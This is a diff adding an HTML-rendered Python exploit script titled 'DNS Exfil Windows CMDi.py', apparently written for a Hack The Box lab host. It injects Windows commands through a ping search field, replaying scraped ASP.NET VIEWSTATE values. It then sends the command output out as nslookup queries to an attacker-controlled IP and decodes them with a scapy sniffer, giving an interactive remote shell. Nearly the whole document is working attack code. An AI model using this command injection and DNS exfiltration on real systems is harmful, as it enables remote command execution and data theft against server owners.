@@ -1,0 +1,96 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>DNS Exfil Windows CMDi.py</title>
+</head><body>#!/usr/bin/env python<br/>
+# skeleton code from<br/>
+# https://blog.skyplabs.net/2018/03/01/python-sniffing-inside-a-thread-with-scapy/<br/>
+<br/>
+import requests<br/>
+from bs4 import BeautifulSoup<br/>
+from requests.auth import HTTPBasicAuth<br/>
+from cmd import Cmd<br/>
+from scapy.all import *<br/>
+from threading import Thread<br/>
+from time import sleep<br/>
+<br/>
+class Terminal(Cmd):<br/>
+&nbsp; &nbsp; prompt = '&gt; '<br/>
+<br/>
+&nbsp; &nbsp; def __init__(self):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.auth = HTTPBasicAuth('USERNAME','PASSWORD')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; page = requests.get('http://target.htb:8080', auth=self.auth)<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; soup = BeautifulSoup(page.text, 'html.parser')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # where 'name' is = '__VIEWSTATE' grab the 'value', etc, etc<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # THESE VALUES ARE SPECIFIC TO THE WEBSITE<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.VS = soup.find('input', {'name':'__VIEWSTATE'})['value']<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.VSG = soup.find('input', {'name':'__VIEWSTATEGENERATOR'})['value']<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.EV = soup.find('input', {'name':'__EVENTVALIDATION'})['value']<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.CTL = soup.find('input', {'name':'ctl02'})['value']<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; Cmd.__init__(self)<br/>
+<br/>
+# do_cmd for raw commands where we don't need output<br/>
+# may need to be replaced with: start cmd /c "{args}"<br/>
+# start before a command will open it in a new window<br/>
+# to execute, type 'cmd &lt;your_command_here&gt;' at the prompt<br/>
+&nbsp; &nbsp; def do_cmd(self, args):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmd = f"""-n 1 127.0.0.1 &amp;&amp; cmd /c "{args}" """<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; data = { '__VIEWSTATE':self.VS, '__VIEWSTATEGENERATOR':self.VSG, '__EVENTVALIDATION':self.EV, 'search':cmd, 'ctl02':self.CTL }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; requests.post('http://target.htb:8080', data=data, auth=self.auth)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #print(args)<br/>
+<br/>
+# default for running commands and retrieving output (pretty print)<br/>
+&nbsp; &nbsp; def default(self, args):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # Possible to speed up nslookup? /set retry=0 timeout=1 or just -retry=0 -timeout=1<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # eventuall figure out that args needs to be called by 'cmd /c' for certain commands to finish running<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # tokens 1,2,3,4,5,6 %a%b%c%d%e%f is formatting and puts all data smashed together <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #cmd = f"""-n 1 127.0.0.1 &amp;&amp; for /f "tokens=1,2,3,4,5,6" %a in ('cmd /c "{args}"') do nslookup %a%b%c%d%e%f &lt;target_ip&gt;"""<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # prettier formatting using tokens=1-26 [az]. This will put our data in between Q and Z separated by<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # a period and gives us 26 tokens worth of data. This requires us to change how we print because <br/>
+&nbsp; &nbsp; &nbsp; &nbsp; # we have a lot of Qs and Zs and .s separating our data<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; cmd = f"""-n 1 127.0.0.1 &amp;&amp; for /f "tokens=1-26" %a in ('cmd /c "{args}"') do nslookup Q%aZ.Q%bZ.Q%cZ.Q%dZ.Q%eZ.Q%fZ.Q%gZ.Q%hZ.Q%iZ.Q%jZ.Q%kZ.Q%lZ.Q%mZ.Q%nZ.Q%oZ.Q%pZ.Q%qZ.Q%rZ.Q%sZ.Q%tZ.Q%uZ.Q%vZ.Q%wZ.Q%xZ.Q%yZ.Q%zZ. &lt;target_ip&gt;"""<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; data = { '__VIEWSTATE':self.VS, '__VIEWSTATEGENERATOR':self.VSG, '__EVENTVALIDATION':self.EV, 'search':cmd, 'ctl02':self.CTL }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; requests.post('http://target.htb:8080', data=data, auth=self.auth)<br/>
+<br/>
+<br/>
+class Sniffer(Thread):<br/>
+&nbsp; &nbsp; def &nbsp;__init__(self, interface="eth0"):&#09;#DEFINE INTERFACE TODO CHANGE ME<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; super().__init__()<br/>
+<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; self.interface = interface<br/>
+<br/>
+&nbsp; &nbsp; def run(self):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; sniff(iface=self.interface, filter="ip", prn=self.print_packet)<br/>
+<br/>
+&nbsp; &nbsp; def print_packet(self, packet):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; if (packet.haslayer(DNS)):<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if packet.dport == 53:<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; qname = (packet.qd.qname).decode("utf-8") &nbsp; &nbsp;#need convert utf-8 otherwise will be in bytes<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; qtype = packet.qd.qtype<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; if qtype == 1: &nbsp; &nbsp;# 1 means request, 12 is reverse lookup, 28 is response<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #print(qname) #print(qname) only if using simple cmd formatting (few tokens)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; print(qname[1:-2].replace("Z.Q"," ").strip() #Z.Q means there is no data in consecutive tokens, and then we strip the trailing spaces. Then remove first char (Q) and last two chars (Z.) for finished pretty print<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #print(qtype)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; #print(packet)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #ip_layer = packet.getlayer(IP)<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; #print("[!] New Packet: {src} -&gt; {dst}".format(src=ip_layer.src, dst=ip_layer.dst))<br/>
+<br/>
+sniffer = Sniffer()<br/>
+print("[*] Start sniffing...")<br/>
+sniffer.start()<br/>
+<br/>
+terminal = Terminal()<br/>
+terminal.cmdloop()<br/>
+<br/>
+#original 'sniffing only' code<br/>
+#try:<br/>
+# &nbsp; &nbsp;while True:<br/>
+# &nbsp; &nbsp; &nbsp; &nbsp;sleep(100)<br/>
+#except KeyboardInterrupt:<br/>
+# &nbsp; &nbsp;print("[*] Stop sniffing")<br/>
+# &nbsp; &nbsp;sniffer.join()<br/>
+<br/>
+</body></html>
